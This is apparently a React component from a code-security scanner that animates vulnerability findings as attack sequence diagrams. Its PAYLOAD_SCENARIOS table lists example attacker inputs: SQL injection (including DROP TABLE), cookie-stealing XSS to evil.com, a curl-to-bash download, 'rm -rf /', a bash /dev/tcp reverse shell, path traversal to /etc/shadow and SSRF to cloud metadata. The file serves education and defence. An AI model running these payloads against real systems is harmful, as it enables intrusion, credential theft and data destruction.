"use client"
// src/components/AttackSimulationView.jsx
//
// Renders finding.path as a UML-style sequence diagram: one lifeline per
// actor (Attacker -> your code -> the sink), with an arrow per hop. The
// SEQUENCE is deterministic — it's just finding.path — nothing here is
// generated. Only per-arrow narration text is optionally AI-enriched.
//
// Actor count follows path length + 1 (the implicit Attacker actor):
//   - Flow findings (2 path nodes: source, sink) -> 3 actors, 2 arrows.
//   - Standalone findings (1 path node: sink only, e.g. hardcoded secret,
//     weak crypto, insecure cookie) -> 2 actors, 1 arrow.
// Same component handles both; no special-casing needed.
//
// CHANGE: added multi-payload scenario toggle. For flow-based vuln types,
// 2-3 pre-built attacker input scenarios let the user switch payloads and
// watch the narration/diagram detail change live.

import React, { useEffect, useRef, useState, useCallback } from "react";
import {
  VenetianMask,
  Code2,
  Database,
  MonitorSmartphone,
  SquareTerminal,
  FolderOpen,
  Bug,
  Globe,
  ExternalLink,
  KeyRound,
  ShieldOff,
  Cookie,
  AlertTriangle,
} from "lucide-react";

const STEP_DURATION_MS = 2200;

const ROLE_COLOR = {
  source: "#22d3ee", // cyan
  sink: "#f87171", // red
};

// Sink actor presentation, keyed by the same normalized vulnerability_type
// used in templates.js. Determines the icon + label for the final lifeline.
const SINK_ACTOR = {
  "sql-injection": { icon: Database, label: "Database" },
  "cross-site-scripting-reflected": { icon: MonitorSmartphone, label: "Victim's Browser" },
  "cross-site-scripting-dom": { icon: MonitorSmartphone, label: "Victim's Browser" },
  "command-injection": { icon: SquareTerminal, label: "Shell" },
  "path-traversal": { icon: FolderOpen, label: "Filesystem" },
  "code-injection-eval": { icon: Bug, label: "Runtime" },
  "code-injection-function-constructor": { icon: Bug, label: "Runtime" },
  "server-side-request-forgery-ssrf": { icon: Globe, label: "Internal Network" },
  "open-redirect": { icon: ExternalLink, label: "External Site" },
  "hardcoded-secret": { icon: KeyRound, label: "Exposed Secret" },
  "weak-cryptographic-algorithm": { icon: ShieldOff, label: "Broken Crypto" },
  "insecure-cookie-configuration": { icon: Cookie, label: "Cookie Jar" },
};
const DEFAULT_SINK_ACTOR = { icon: AlertTriangle, label: "Sink" };

// ── Multi-payload scenarios ────────────────────────────────────────────
// Each key maps to 2-3 attacker input variants. `stepNarrations` array
// parallels finding.path: index 0 = source narration, index 1 = sink
// narration.  For standalone findings (1-step path), use a single-element
// stepNarrations array.
const PAYLOAD_SCENARIOS = {
  "sql-injection": [
    {
      label: "UNION extraction",
      attackerInput: "' UNION SELECT username, password FROM users --",
      stepNarrations: [
        "Attacker submits a UNION-based SQL payload through the input field",
        "The injected UNION reaches db.query() — the database returns all usernames and passwords alongside legitimate results",
      ],
    },
    {
      label: "Boolean blind",
      attackerInput: "' AND 1=1 --",
      stepNarrations: [
        "Attacker probes with a boolean condition that always evaluates true",
        "db.query() executes the tautology — by toggling 1=1 vs 1=0 the attacker infers data one bit at a time",
      ],
    },
    {
      label: "Stacked queries",
      attackerInput: "'; DROP TABLE users; --",
      stepNarrations: [
        "Attacker terminates the original query and appends a destructive DROP TABLE statement",
        "db.query() executes both statements — the users table is permanently deleted",
      ],
    },
  ],
  "cross-site-scripting-reflected": [
    {
      label: "<script> tag",
      attackerInput: '<script>document.location="https://evil.com/?c="+document.cookie</script>',
      stepNarrations: [
        "Attacker injects a classic <script> tag that exfiltrates cookies",
        "The unsanitized payload renders in the victim's browser — cookies are sent to the attacker's server",
      ],
    },
    {
      label: "Event handler",
      attackerInput: '" onmouseover="alert(document.cookie)" x="',
      stepNarrations: [
        "Attacker breaks out of an HTML attribute and injects an onmouseover handler",
        "When the victim hovers over the element, the injected JavaScript executes in their session",
      ],
    },
    {
      label: "SVG/onload",
      attackerInput: '<svg/onload=fetch("https://evil.com/?d="+document.domain)>',
      stepNarrations: [
        "Attacker uses an SVG element with an onload event to bypass basic tag filters",
        "The SVG loads instantly — the browser executes the fetch and leaks the domain to the attacker",
      ],
    },
  ],
  "cross-site-scripting-dom": [
    {
      label: "innerHTML injection",
      attackerInput: '<img src=x onerror="alert(document.cookie)">',
      stepNarrations: [
        "Attacker crafts a malicious HTML string with an error-triggered event handler",
        "The tainted string is assigned to innerHTML — the browser parses the img tag and fires onerror",
      ],
    },
    {
      label: "Template literal",
      attackerInput: '${document.cookie}"><script>fetch("https://evil.com/steal")</script>',
      stepNarrations: [
        "Attacker injects a template literal breakout with an embedded script",
        "innerHTML receives the interpolated payload — the script tag executes in the page context",
      ],
    },
  ],
  "command-injection": [
    {
      label: "Pipe chain",
      attackerInput: "file.txt | cat /etc/passwd",
      stepNarrations: [
        "Attacker appends a pipe operator to chain an unauthorized command",
        "exec() passes the full string to the shell — /etc/passwd contents are piped back to the attacker",
      ],
    },
    {
      label: "Subshell $(…)",
      attackerInput: "$(curl https://evil.com/shell.sh | bash)",
      stepNarrations: [
        "Attacker wraps a reverse-shell downloader in a subshell expansion",
        "The shell expands $() first, down and executing the remote script before the original command runs",
      ],
    },
    {
      label: "Semicolon separator",
      attackerInput: "; rm -rf / --no-preserve-root",
      stepNarrations: [
        "Attacker terminates the intended command with a semicolon and appends a destructive rm",
        "exec() runs both commands sequentially — the filesystem is wiped from root",
      ],
    },
  ],
  "path-traversal": [
    {
      label: "Classic ../../",
      attackerInput: "../../../../etc/passwd",
      stepNarrations: [
        "Attacker uses repeated ../ sequences to escape the intended directory",
        "readFile() resolves the relative path and reads /etc/passwd — sensitive system credentials leak",
      ],
    },
    {
      label: "URL-encoded",
      attackerInput: "..%2F..%2F..%2Fetc%2Fshadow",
      stepNarrations: [
        "Attacker URL-encodes the traversal slashes to bypass naive input filters",
        "The server decodes %2F back to / before calling readFile() — the shadow file is exposed",
      ],
    },
  ],
  "code-injection-eval": [
    {
      label: "Direct eval",
      attackerInput: "require('child_process').execSync('whoami').toString()",
      stepNarrations: [
        "Attacker submits a Node.js expression that spawns a child process",
        "eval() executes the string as code — the server runs whoami and returns the result",
      ],
    },
    {
      label: "Process env leak",
      attackerInput: "JSON.stringify(process.env)",
      stepNarrations: [
        "Attacker requests the full environment variable dump",
        "eval() serializes process.env — database credentials, API keys, and secrets are exposed",
      ],
    },
  ],
  "code-injection-function-constructor": [
    {
      label: "Constructor RCE",
      attackerInput: "return require('child_process').execSync('id').toString()",
      stepNarrations: [
        "Attacker passes code to the Function constructor that spawns a system command",
        "new Function() compiles and executes the string — the server identity is leaked",
      ],
    },
    {
      label: "Reverse shell",
      attackerInput: "return require('child_process').execSync('bash -i >& /dev/tcp/evil.com/4444 0>&1')",
      stepNarrations: [
        "Attacker injects a bash reverse shell via the Function constructor body",
        "The compiled function opens an interactive shell connection back to the attacker's machine",
      ],
    },
  ],
  "server-side-request-forgery-ssrf": [
    {
      label: "Cloud metadata",
      attackerInput: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      stepNarrations: [
        "Attacker points the URL to the AWS instance metadata endpoint",
        "fetch() hits the internal metadata service — IAM temporary credentials are returned to the attacker",
      ],
    },
    {
      label: "Internal port scan",
      attackerInput: "http://127.0.0.1:6379/",
      stepNarrations: [
        "Attacker targets localhost on the Redis default port to probe internal services",
        "fetch() connects to the internal Redis instance — response timing reveals whether the port is open",
      ],
    },
    {
      label: "file:// protocol",
      attackerInput: "file:///etc/passwd",
      stepNarrations: [
        "Attacker uses the file:// protocol scheme to read local files via the server",
        "fetch() reads the local filesystem — /etc/passwd contents are returned in the response body",
      ],
    },
  ],
  "open-redirect": [
    {
      label: "External redirect",
      attackerInput: "https://evil.com/phishing-login",
      stepNarrations: [
        "Attacker sets the redirect URL to a phishing page that mimics the legitimate login",
        "redirect() sends the victim to the attacker's domain — they unknowingly enter credentials on a fake site",
      ],
    },
    {
      label: "Protocol-relative",
      attackerInput: "//evil.com/harvest",
      stepNarrations: [
        "Attacker uses a protocol-relative URL to bypass scheme-based validation",
        "redirect() resolves //evil.com using the current protocol — the victim is silently redirected",
      ],
    },
  ],
};

function normalizeType(type) {
  return (type || "").toLowerCase().replace(/[()]/g, "").trim().replace(/\s+/g, "-");
}

function buildStepsFromPath(finding, scenario) {
  return (finding.path || []).map((node, i) => ({
    role: node.type === "source" ? "source" : "sink",
    line: node.line,
    file: node.file,
    snippet: node.snippet,
    text:
      scenario && scenario.stepNarrations[i]
        ? scenario.stepNarrations[i]
        : node.type === "source"
          ? `Tainted data enters here through ${node.snippet}`
          : `Data reaches ${node.snippet} — a sensitive operation`,
  }));
}

export default function AttackSimulationView({ finding }) {
  const sinkKey = normalizeType(finding.vulnerability_type);
  const scenarios = PAYLOAD_SCENARIOS[sinkKey] || null;
  const hasScenarios = scenarios && scenarios.length > 1;

  const [activeScenario, setActiveScenario] = useState(0);
  const currentScenario = scenarios ? scenarios[activeScenario] : null;

  const [steps, setSteps] = useState(() => buildStepsFromPath(finding, currentScenario));
  const [currentIndex, setCurrentIndex] = useState(0);
  const [playing, setPlaying] = useState(false);
  const timerRef = useRef(null);

  // Reset everything when the finding changes
  useEffect(() => {
    setActiveScenario(0);
    const sc = scenarios ? scenarios[0] : null;
    setSteps(buildStepsFromPath(finding, sc));
    setCurrentIndex(0);
    setPlaying(false);
  }, [finding]);

  // Rebuild steps when the active scenario changes (but NOT on finding change —
  // that's handled above)
  const prevFindingRef = useRef(finding);
  useEffect(() => {
    if (prevFindingRef.current === finding) {
      // Only scenario changed, not the finding
      const sc = scenarios ? scenarios[activeScenario] : null;
      setSteps(buildStepsFromPath(finding, sc));
      setCurrentIndex(0);
      setPlaying(false);
    }
    prevFindingRef.current = finding;
  }, [activeScenario]);

  useEffect(() => {
    if (!playing) return;
    if (currentIndex >= steps.length - 1) {
      setPlaying(false);
      return;
    }
    timerRef.current = setTimeout(() => {
      setCurrentIndex((i) => Math.min(i + 1, steps.length - 1));
    }, STEP_DURATION_MS);
    return () => clearTimeout(timerRef.current);
  }, [playing, currentIndex, steps.length]);

  const play = useCallback(() => {
    if (currentIndex >= steps.length - 1) setCurrentIndex(0);
    setPlaying(true);
  }, [currentIndex, steps.length]);

  const pause = useCallback(() => setPlaying(false), []);

  const jumpTo = useCallback((i) => {
    setPlaying(false);
    setCurrentIndex(i);
  }, []);

  const switchScenario = useCallback((i) => {
    setActiveScenario(i);
  }, []);


  if (!steps.length) return null;

  const sinkActor = SINK_ACTOR[sinkKey] || DEFAULT_SINK_ACTOR;
  const SinkIcon = sinkActor.icon;

  // Actors: Attacker, then one per path node. Flow findings get a middle
  // "Your Code" actor (the source); standalone findings skip straight to
  // the sink actor since there's no source node.
  const actors = [{ icon: VenetianMask, label: "Attacker", accent: "#a78bfa" }];
  steps.forEach((step) => {
    if (step.role === "source") {
      actors.push({ icon: Code2, label: "Your Code", accent: ROLE_COLOR.source });
    } else {
      actors.push({ icon: SinkIcon, label: sinkActor.label, accent: ROLE_COLOR.sink });
    }
  });

  const current = steps[currentIndex];
  const isFinalStep = currentIndex === steps.length - 1;
  const colCount = actors.length;

  return (
    <div className="rounded-xl border border-white/10 bg-black/40 backdrop-blur-md p-5">
      <div className="flex items-center justify-between mb-4">
        <h3 className="text-sm font-semibold text-white/90 tracking-wide">Attack Simulation</h3>
        <div className="flex items-center gap-2">
          {/* Scenario toggle buttons */}
          {hasScenarios && scenarios.map((sc, i) => (
            <button
              key={i}
              onClick={() => switchScenario(i)}
              className={`text-[10px] px-2.5 py-1 rounded-md border transition-all duration-200 ${
                i === activeScenario
                  ? "border-violet-400/50 bg-violet-500/15 text-violet-300 shadow-[0_0_8px_rgba(139,92,246,0.15)]"
                  : "border-white/10 text-white/40 hover:text-white/60 hover:border-white/20 hover:bg-white/5"
              }`}
              title={sc.attackerInput}
            >
              {sc.label}
            </button>
          ))}

          {/* Divider between scenario buttons and play control */}
          {hasScenarios && (
            <div className="w-px h-4 bg-white/10 mx-1" />
          )}

          <button
            onClick={playing ? pause : play}
            className="text-xs px-3 py-1 rounded-md border border-cyan-400/30 text-cyan-300 hover:bg-cyan-400/10 transition-colors"
          >
            {playing ? "Pause" : currentIndex >= steps.length - 1 ? "Replay" : "Play"}
          </button>
        </div>
      </div>

      {/* Active attacker input display */}
      {currentScenario && (
        <div className="mb-4 rounded-lg border border-red-500/20 bg-red-500/5 px-3 py-2.5">
          <div className="text-[10px] uppercase tracking-wider text-red-400/70 mb-1.5 font-medium">
            Attacker Input
          </div>
          <code className="block text-xs font-mono text-red-300 break-all whitespace-pre-wrap leading-relaxed">
            {currentScenario.attackerInput}
          </code>
        </div>
      )}

      {/* Sequence diagram */}
      <div className="relative">
        {/* Actor row */}
        <div className="grid" style={{ gridTemplateColumns: `repeat(${colCount}, 1fr)` }}>
          {actors.map((actor, i) => {
            const ActorIcon = actor.icon;
            const isActiveSink = i === actors.length - 1 && isFinalStep;
            return (
              <div key={i} className="flex flex-col items-center gap-2 pb-4 relative z-10">
                <div
                  className="relative w-12 h-12 rounded-full flex items-center justify-center border transition-all duration-300"
                  style={{
                    borderColor: `${actor.accent}55`,
                    backgroundColor: `${actor.accent}15`,
                    boxShadow: isActiveSink ? `0 0 0 1px ${actor.accent}, 0 0 24px 6px ${actor.accent}88` : "none",
                  }}
                >
                  <ActorIcon size={20} style={{ color: actor.accent }} />
                  {/* Detonation pulse rings on the sink at the final step */}
                  {isActiveSink && (
                    <>
                      <span
                        className="absolute inset-0 rounded-full animate-ping"
                        style={{ backgroundColor: `${actor.accent}30`, animationDuration: "1.4s" }}
                      />
                      <span
                        className="absolute -inset-2 rounded-full border animate-ping"
                        style={{ borderColor: `${actor.accent}60`, animationDuration: "1.8s" }}
                      />
                    </>
                  )}
                </div>
                <span className="text-[10px] uppercase tracking-wider text-white/50 text-center px-1">
                  {actor.label}
                </span>
              </div>
            );
          })}
        </div>

        {/* Lifelines + arrows */}
        <div className="relative" style={{ height: `${steps.length * 56 + 12}px` }}>
          {/* dashed vertical lifelines, one per actor, centered under each avatar */}
          <div className="absolute inset-0 grid" style={{ gridTemplateColumns: `repeat(${colCount}, 1fr)` }}>
            {actors.map((_, i) => (
              <div key={i} className="flex justify-center">
                <div className="w-px h-full border-l border-dashed border-white/15" />
              </div>
            ))}
          </div>

          {/* one horizontal arrow per step, stacked top to bottom */}
          {steps.map((step, i) => {
            const topPct = ((i + 1) / (steps.length + 1)) * 100;
            const leftPct = (i / colCount) * 100 + 100 / colCount / 2;
            const rightPct = ((i + 1) / colCount) * 100 + 100 / colCount / 2;
            const isActive = i === currentIndex;
            const color = ROLE_COLOR[step.role];

            return (
              <button
                key={i}
                onClick={() => jumpTo(i)}
                className="absolute flex items-center group"
                style={{
                  top: `${topPct}%`,
                  left: `${leftPct}%`,
                  width: `${rightPct - leftPct}%`,
                  transform: "translateY(-50%)",
                }}
              >
                <div
                  className="relative h-px flex-1 transition-colors duration-300"
                  style={{ backgroundColor: isActive ? color : "rgba(255,255,255,0.15)" }}
                >
                  {/* traveling payload, replays via key remount whenever this step becomes active */}
                  {isActive && (
                    <span
                      key={`${i}-${playing}-${currentIndex}-${activeScenario}`}
                      className="absolute top-1/2 -mt-1 w-2 h-2 rounded-full"
                      style={{
                        backgroundColor: color,
                        boxShadow: `0 0 8px 2px ${color}`,
                        animation: "nemesys-payload-travel 900ms ease-out forwards",
                      }}
                    />
                  )}
                  {/* arrowhead */}
                  <div
                    className="absolute right-0 top-1/2 -translate-y-1/2 w-0 h-0 transition-colors duration-300"
                    style={{
                      borderTop: "4px solid transparent",
                      borderBottom: "4px solid transparent",
                      borderLeft: `6px solid ${isActive ? color : "rgba(255,255,255,0.15)"}`,
                    }}
                  />
                </div>
                <span
                  className="absolute left-1/2 -translate-x-1/2 -top-4 text-[9px] uppercase tracking-wide whitespace-nowrap px-1.5 py-0.5 rounded transition-colors"
                  style={{
                    color: isActive ? color : "rgba(255,255,255,0.35)",
                    backgroundColor: isActive ? "rgba(0,0,0,0.5)" : "transparent",
                  }}
                >
                  Step {i + 1}
                </span>
              </button>
            );
          })}
        </div>
      </div>

      {/* Current step detail */}
      <div className="rounded-lg border border-white/10 bg-white/5 p-4 mt-2">
        <div className="flex items-center justify-between mb-2">
          <span
            className="text-[11px] font-mono uppercase tracking-wider"
            style={{ color: ROLE_COLOR[current.role] }}
          >
            Step {currentIndex + 1} of {steps.length}
            {steps.length === 1 ? " — Static Issue" : current.role === "source" ? " — Entry" : " — Detonates"}
          </span>
          <span className="text-[11px] font-mono text-white/40">line {current.line}</span>
        </div>
        <code className="block text-xs font-mono text-white/70 bg-black/40 rounded px-2 py-1.5 mb-3 overflow-x-auto">
          {current.snippet}
        </code>
        <p className="text-sm text-white/85 leading-relaxed">{current.text}</p>
      </div>

      <style jsx>{`
        @keyframes nemesys-payload-travel {
          from {
            left: 0%;
            opacity: 0;
          }
          10% {
            opacity: 1;
          }
          to {
            left: calc(100% - 8px);
            opacity: 1;
          }
        }
      `}</style>
    </div>
  );
}